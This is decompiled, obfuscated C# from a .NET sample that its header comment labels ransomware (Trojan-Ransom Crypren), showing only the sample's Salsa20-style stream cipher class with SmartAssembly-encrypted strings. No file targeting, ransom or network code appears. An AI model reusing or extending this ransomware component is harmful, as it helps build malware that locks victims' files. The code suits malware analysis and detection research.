// Decompiled with JetBrains decompiler
// Type: RsIcyUzdWFKY.nzCLlPCHXLqP
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A95A28D5-8216-4857-B945-01900B674D16
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-8a4a038a965ba42a0442d44abf25e4d21f5049d4a4a8aa9cb6691ec4282814a1.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace RsIcyUzdWFKY
{
  public sealed class nzCLlPCHXLqP : SymmetricAlgorithm
  {
    private int pWpJOKopnvZtozg;
    [NonSerialized]
    internal static GetString \u008B;

    public static byte[] HSujbXnDcqZ([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray1 = obj1;
      byte[] numArray2 = obj2;
      using (nzCLlPCHXLqP nzCllPchxLqP = new nzCLlPCHXLqP())
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          nzCllPchxLqP.Key = numArray1;
          nzCllPchxLqP.IV = numArray2;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, nzCllPchxLqP.CreateEncryptor(), CryptoStreamMode.Write))
          {
            byte[] buffer = obj0;
            cryptoStream.Write(buffer, 0, buffer.Length);
            cryptoStream.FlushFinalBlock();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public nzCLlPCHXLqP()
    {
      this.LegalBlockSizesValue = new KeySizes[1]
      {
        new KeySizes(512, 512, 0)
      };
      this.LegalKeySizesValue = new KeySizes[1]
      {
        new KeySizes(128, 256, 128)
      };
      this.BlockSizeValue = 512;
      this.KeySizeValue = 256;
      this.pWpJOKopnvZtozg = 20;
    }

    [SpecialName]
    public override byte[] get_IV() => base.IV;

    [SpecialName]
    public override void set_IV([In] byte[] obj0)
    {
      nzCLlPCHXLqP.sWrKHmgsunSD(obj0, nzCLlPCHXLqP.\u008B(107408098));
      this.IVValue = (byte[]) obj0.Clone();
    }

    public override ICryptoTransform CreateDecryptor([In] byte[] obj0, [In] byte[] obj1) => this.CreateEncryptor(obj0, obj1);

    public override ICryptoTransform CreateEncryptor([In] byte[] obj0, [In] byte[] obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(nzCLlPCHXLqP.\u008B(107408089));
      if (!this.ValidKeySize(obj0.Length * 8))
        throw new CryptographicException(nzCLlPCHXLqP.\u008B(107408112));
      nzCLlPCHXLqP.sWrKHmgsunSD(obj1, nzCLlPCHXLqP.\u008B(107408051));
      return (ICryptoTransform) new nzCLlPCHXLqP.MXbmoCqGqug(obj0, obj1, this.pWpJOKopnvZtozg);
    }

    public override void GenerateIV() => this.IVValue = nzCLlPCHXLqP.LHKafBROEKStb(8);

    public override void GenerateKey() => this.KeyValue = nzCLlPCHXLqP.LHKafBROEKStb(this.KeySize / 8);

    private static void sWrKHmgsunSD([In] byte[] obj0, [In] string obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(obj1);
      if (obj0.Length != 8)
        throw new CryptographicException(nzCLlPCHXLqP.\u008B(107408042));
    }

    private static byte[] LHKafBROEKStb([In] int obj0)
    {
      byte[] data = new byte[obj0];
      using (RandomNumberGenerator randomNumberGenerator = (RandomNumberGenerator) new RNGCryptoServiceProvider())
        randomNumberGenerator.GetBytes(data);
      return data;
    }

    static nzCLlPCHXLqP() => Strings.CreateGetStringDelegate(typeof (nzCLlPCHXLqP));

    private sealed class MXbmoCqGqug : ICryptoTransform, IDisposable
    {
      private static readonly byte[] UfTajXEiJTxZg;
      private static readonly byte[] uWgMNEEinZC;
      private readonly int pWpJOKopnvZtozg;
      private uint[] EPHhyeLwNhwN;
      [NonSerialized]
      internal static GetString \u0006;

      public MXbmoCqGqug([In] byte[] obj0, [In] byte[] obj1, [In] int obj2)
      {
        this.Initialize(obj0, obj1);
        this.pWpJOKopnvZtozg = obj2;
      }

      [SpecialName]
      public bool get_CanReuseTransform() => false;

      [SpecialName]
      public bool get_CanTransformMultipleBlocks() => true;

      [SpecialName]
      public int get_InputBlockSize() => 64;

      [SpecialName]
      public int get_OutputBlockSize() => 64;

      public int TransformBlock([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] byte[] obj3, [In] int obj4)
      {
        if (obj0 == null)
          throw new ArgumentNullException(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408478));
        if (obj1 < 0 || obj1 >= obj0.Length)
          throw new ArgumentOutOfRangeException(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408493));
        if (obj2 < 0 || obj1 + obj2 > obj0.Length)
          throw new ArgumentOutOfRangeException(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408444));
        if (obj3 == null)
          throw new ArgumentNullException(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408459));
        if (obj4 < 0 || obj4 + obj2 > obj3.Length)
          throw new ArgumentOutOfRangeException(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408410));
        if (this.EPHhyeLwNhwN == null)
          throw new ObjectDisposedException(this.GetType().Name);
        byte[] numArray = new byte[64];
        int num1 = 0;
        while (obj2 > 0)
        {
          this.Hash(numArray, this.EPHhyeLwNhwN);
          this.EPHhyeLwNhwN[8] = nzCLlPCHXLqP.MXbmoCqGqug.AddOne(this.EPHhyeLwNhwN[8]);
          if (this.EPHhyeLwNhwN[8] == 0U)
            this.EPHhyeLwNhwN[9] = nzCLlPCHXLqP.MXbmoCqGqug.AddOne(this.EPHhyeLwNhwN[9]);
          int num2 = Math.Min(64, obj2);
          for (int index = 0; index < num2; ++index)
            obj3[obj4 + index] = (byte) ((uint) obj0[obj1 + index] ^ (uint) numArray[index]);
          num1 += num2;
          obj2 -= 64;
          obj4 += 64;
          obj1 += 64;
        }
        return num1;
      }

      public byte[] TransformFinalBlock([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        byte[] numArray = obj2 >= 0 ? new byte[obj2] : throw new ArgumentOutOfRangeException(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408444));
        this.TransformBlock(obj0, obj1, obj2, numArray, 0);
        return numArray;
      }

      public void Dispose()
      {
        if (this.EPHhyeLwNhwN != null)
          Array.Clear((Array) this.EPHhyeLwNhwN, 0, this.EPHhyeLwNhwN.Length);
        this.EPHhyeLwNhwN = (uint[]) null;
      }

      private static uint Rotate([In] uint obj0, [In] int obj1) => obj0 << obj1 | obj0 >> 32 - obj1;

      private static uint Add([In] uint obj0, [In] uint obj1) => obj0 + obj1;

      private static uint AddOne([In] uint obj0) => obj0 + 1U;

      private void Hash([In] byte[] obj0, [In] uint[] obj1)
      {
        uint[] numArray = (uint[]) obj1.Clone();
        for (int pWpJoKopnvZtozg = this.pWpJOKopnvZtozg; pWpJoKopnvZtozg > 0; pWpJoKopnvZtozg -= 2)
        {
          numArray[4] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[0], numArray[12]), 7);
          numArray[8] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[4], numArray[0]), 9);
          numArray[12] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[8], numArray[4]), 13);
          numArray[0] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[12], numArray[8]), 18);
          numArray[9] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[5], numArray[1]), 7);
          numArray[13] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[9], numArray[5]), 9);
          numArray[1] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[13], numArray[9]), 13);
          numArray[5] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[1], numArray[13]), 18);
          numArray[14] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[10], numArray[6]), 7);
          numArray[2] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[14], numArray[10]), 9);
          numArray[6] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[2], numArray[14]), 13);
          numArray[10] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[6], numArray[2]), 18);
          numArray[3] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[15], numArray[11]), 7);
          numArray[7] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[3], numArray[15]), 9);
          numArray[11] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[7], numArray[3]), 13);
          numArray[15] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[11], numArray[7]), 18);
          numArray[1] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[0], numArray[3]), 7);
          numArray[2] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[1], numArray[0]), 9);
          numArray[3] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[2], numArray[1]), 13);
          numArray[0] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[3], numArray[2]), 18);
          numArray[6] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[5], numArray[4]), 7);
          numArray[7] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[6], numArray[5]), 9);
          numArray[4] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[7], numArray[6]), 13);
          numArray[5] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[4], numArray[7]), 18);
          numArray[11] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[10], numArray[9]), 7);
          numArray[8] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[11], numArray[10]), 9);
          numArray[9] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[8], numArray[11]), 13);
          numArray[10] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[9], numArray[8]), 18);
          numArray[12] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[15], numArray[14]), 7);
          numArray[13] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[12], numArray[15]), 9);
          numArray[14] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[13], numArray[12]), 13);
          numArray[15] ^= nzCLlPCHXLqP.MXbmoCqGqug.Rotate(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[14], numArray[13]), 18);
        }
        for (int index = 0; index < 16; ++index)
          nzCLlPCHXLqP.MXbmoCqGqug.ToBytes(nzCLlPCHXLqP.MXbmoCqGqug.Add(numArray[index], obj1[index]), obj0, 4 * index);
      }

      private void Initialize([In] byte[] obj0, [In] byte[] obj1)
      {
        this.EPHhyeLwNhwN = new uint[16];
        this.EPHhyeLwNhwN[1] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, 0);
        this.EPHhyeLwNhwN[2] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, 4);
        this.EPHhyeLwNhwN[3] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, 8);
        this.EPHhyeLwNhwN[4] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, 12);
        byte[] numArray = obj0.Length == 32 ? nzCLlPCHXLqP.MXbmoCqGqug.UfTajXEiJTxZg : nzCLlPCHXLqP.MXbmoCqGqug.uWgMNEEinZC;
        int num = obj0.Length - 16;
        this.EPHhyeLwNhwN[11] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, num);
        this.EPHhyeLwNhwN[12] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, num + 4);
        this.EPHhyeLwNhwN[13] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, num + 8);
        this.EPHhyeLwNhwN[14] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj0, num + 12);
        this.EPHhyeLwNhwN[0] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(numArray, 0);
        this.EPHhyeLwNhwN[5] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(numArray, 4);
        this.EPHhyeLwNhwN[10] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(numArray, 8);
        this.EPHhyeLwNhwN[15] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(numArray, 12);
        this.EPHhyeLwNhwN[6] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj1, 0);
        this.EPHhyeLwNhwN[7] = nzCLlPCHXLqP.MXbmoCqGqug.ToUInt32(obj1, 4);
        this.EPHhyeLwNhwN[8] = 0U;
        this.EPHhyeLwNhwN[9] = 0U;
      }

      private static uint ToUInt32([In] byte[] obj0, [In] int obj1) => (uint) ((int) obj0[obj1] | (int) obj0[obj1 + 1] << 8 | (int) obj0[obj1 + 2] << 16 | (int) obj0[obj1 + 3] << 24);

      private static void ToBytes([In] uint obj0, [In] byte[] obj1, [In] int obj2)
      {
        obj1[obj2] = (byte) obj0;
        obj1[obj2 + 1] = (byte) (obj0 >> 8);
        obj1[obj2 + 2] = (byte) (obj0 >> 16);
        obj1[obj2 + 3] = (byte) (obj0 >> 24);
      }

      static MXbmoCqGqug()
      {
        Strings.CreateGetStringDelegate(typeof (nzCLlPCHXLqP.MXbmoCqGqug));
        nzCLlPCHXLqP.MXbmoCqGqug.UfTajXEiJTxZg = Encoding.ASCII.GetBytes(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408393));
        nzCLlPCHXLqP.MXbmoCqGqug.uWgMNEEinZC = Encoding.ASCII.GetBytes(nzCLlPCHXLqP.MXbmoCqGqug.\u0006(107408400));
      }
    }
  }
}
